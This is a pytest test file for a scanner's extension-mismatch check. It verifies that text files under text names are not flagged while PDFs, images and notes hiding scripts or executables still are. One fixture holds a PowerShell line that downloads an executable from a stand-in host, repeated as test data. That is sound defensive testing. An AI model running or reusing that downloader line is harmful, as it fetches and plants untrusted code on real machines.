"""`generic.extension_mismatch` is the engine's strongest deception signal.

It fires at HIGH and it names the file `…Riskware.ExtensionMismatch`. It exists
for one thing: a name chosen to make dangerous content look safe. It was firing
on files that contain exactly what they say they contain, because it was reached
through an allow-list of "extensions that hold text", and that list is not a
finite thing to write down. It had already been extended for `.css`, then for
PEM material, then for man pages, then for `.desktop` — and still accused:

    git-log.txt        libmagic reads `commit <sha> / Author: / Date:` as
                       RFC 2822 email headers          -> suspicious at 29.3
    rg.bash            "the bytes are ascii text"      -> suspicious at 33.8
    syncthing.plist    "the bytes are XML Document"    -> suspicious at 27.8

Each of those is the worst-scoring member of an archive, so each one made an
ordinary release zip `suspicious` on `archive.malicious_member`.

The question is now asked the other way round, against a set that IS finite:
does the NAME promise a binary container that the bytes do not deliver? Text
under a name that promises nothing binary is not a disguise, whatever subtype
libmagic picks. `invoice.pdf` holding a PowerShell script still is one.
"""
from __future__ import annotations

import pytest

from app.engine import identify

#: A git log. libmagic sees `Author:`/`Date:` and says RFC 2822.
GIT_LOG = (
    b"commit 9e18bde4c1a2f3b4c5d6e7f8a9b0c1d2e3f4a5b6\n"
    b"Author: A Developer <dev@example.org>\n"
    b"Date:   Mon Jul 20 09:14:22 2026 +0400\n\n"
    b"    Fix the thing\n\n"
) * 40

PLIST = (
    b'<?xml version="1.0" encoding="UTF-8"?>\n'
    b'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">\n'
    b'<plist version="1.0"><dict><key>Label</key><string>syncthing</string></dict></plist>\n'
)

BASH_COMPLETION = (
    b"#!/usr/bin/env bash\n"
    b"_rg() { local cur; COMPREPLY=(); cur=\"${COMP_WORDS[COMP_CWORD]}\"; }\n"
    b"complete -F _rg rg\n"
) * 20

PE = b"MZ\x90\x00" + b"\x00" * 60 + b"PE\x00\x00" + b"\x00" * 3000
POWERSHELL = b"$c = New-Object Net.WebClient\n$c.DownloadFile('http://e/p.exe','p.exe')\n" * 10


def _identify(tmp_path, name: str, payload: bytes):
    path = tmp_path / name
    path.write_bytes(payload)
    return identify.identify(str(path), name)


# --- what it must stop saying ------------------------------------------------

@pytest.mark.parametrize("name,payload", [
    ("git-log.txt", GIT_LOG),
    ("syncthing.plist", PLIST),
    ("rg.bash", BASH_COMPLETION),
    ("rg.fish", BASH_COMPLETION),
    ("rg.zsh", BASH_COMPLETION),
    ("config.hcl", b"resource \"a\" \"b\" {\n  count = 1\n}\n" * 20),
    ("Makefile.am", b"bin_PROGRAMS = rg\nrg_SOURCES = main.c\n" * 20),
    ("notes.adoc", b"= Title\n\nSome text.\n" * 40),
    ("data.ndjson", b'{"a":1}\n{"a":2}\n' * 40),
])
def test_text_under_a_text_name_is_not_a_disguise(tmp_path, name, payload) -> None:
    ident = _identify(tmp_path, name, payload)
    assert not ident.extension_mismatch, (name, ident.mime, ident.magic)


# --- what it must keep saying ------------------------------------------------

@pytest.mark.parametrize("name,payload,why", [
    ("invoice.pdf", POWERSHELL, "a PDF that is really a script"),
    ("report.doc", POWERSHELL, "a Word document that is really a script"),
    ("photo.jpg", GIT_LOG, "an image that is really text"),
    ("archive.zip", GIT_LOG, "an archive that is really text"),
    ("statement.pdf", PE, "a PDF that is really a program"),
    ("holiday.png", PE, "an image that is really a program"),
])
def test_a_binary_name_over_something_else_is_still_a_disguise(
    tmp_path, name, payload, why
) -> None:
    ident = _identify(tmp_path, name, payload)
    assert ident.extension_mismatch, (why, ident.mime, ident.magic)


def test_a_program_named_as_a_note_is_still_a_disguise(tmp_path) -> None:
    """The direction that matters most: the content is dangerous and the name
    hides it. A PE is not inert text, so nothing here reaches it."""
    ident = _identify(tmp_path, "readme.txt", PE)
    assert ident.extension_mismatch, (ident.mime, ident.magic)


def test_the_bounded_set_stays_bounded() -> None:
    """If a later change starts adding source, config or documentation
    extensions to the binary-format set, the list has become the old unbounded
    one again, wearing the new name."""
    forbidden = {".txt", ".md", ".json", ".xml", ".yaml", ".yml", ".ini", ".cfg",
                 ".conf", ".toml", ".csv", ".log", ".sh", ".bash", ".ps1", ".py",
                 ".js", ".ts", ".css", ".html", ".htm", ".svg", ".crt", ".pem",
                 ".key", ".pub", ".plist", ".1", ".desktop", ".service"}
    overlap = forbidden & identify._BINARY_FORMAT_EXTENSIONS
    assert not overlap, overlap
